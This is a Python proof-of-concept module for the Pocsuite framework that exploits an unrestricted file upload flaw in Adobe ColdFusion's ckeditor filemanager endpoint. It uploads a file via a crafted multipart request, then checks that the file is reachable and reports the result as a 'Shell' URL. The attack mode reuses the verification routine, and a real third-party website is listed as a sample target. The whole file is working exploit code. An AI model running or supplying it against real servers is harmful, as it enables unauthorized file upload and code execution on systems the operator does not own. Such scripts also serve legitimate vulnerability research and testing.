#!/usr/bin/env python
# coding: utf-8
from pocsuite.api.request import req
from pocsuite.api.poc import register
from pocsuite.api.poc import Output, POCBase
from pocsuite.api.utils import randomStr
from urlparse import urlparse, urljoin


class TestPOC(POCBase):
    vulID = '97671'
    version = '1.0'
    author = 'fairy'
    vulDate = '2018-11-09'
    createDate = '2019-8-30'
    updateDate = '2019-8-30'
    references = ['https://www.seebug.org/vuldb/ssvid-97671']
    name = 'Adobe ColdFusion 任意文件上传漏洞'
    appPowerLink = 'https://www.adobe.com/products/coldfusion-family.html'
    appName = 'Adobe ColdFusion'
    appVersion = ''
    vulType = '任意文件上传'
    desc = '''
    Adobe ColdFusion 中存在安全漏洞，该漏洞源于程序未限制文件的上传。攻击者可利用该漏洞上传恶意文件，从而执行恶意代码。
    '''
    samples = ['https://www.vendelaredos.com/']
    install_requires = []

    def _verify(self):
        '''verify mode'''
        result = {}
        if urlparse(self.url).port is None:
            self.url = self.url+":8500"
        url = urljoin(self.url, '/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/upload.cfm')
        filename = randomStr(6)
        content = randomStr(12)

        data = "-----------------------------24464570528145\r\n"
        data += "Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n".format(
            filename=filename)
        data += "Content-Type: image/jpeg\r\n"
        data += "\r\n"
        data += "{content}\r\n".format(content=content)
        data += "-----------------------------24464570528145\r\n"
        data += "Content-Disposition: form-data; name=\"path\"\r\n"
        data += "\r\n"
        data += "we\r\n"
        data += "-----------------------------24464570528145--\r\n"

        header = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36",
            "Content-Type": "multipart/form-data; boundary=---------------------------24464570528145"
        }
        req.post(url, headers=header, data=data)

        file_path = "/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/uploadedFiles/" + filename
        file_url = urljoin(self.url, file_path)
        response = req.get(file_url)
        if content in response.content:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Shell'] = file_url

        return self.parse_output(result)

    _attack = _verify

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Internet nothing returned')
        return output


register(TestPOC)

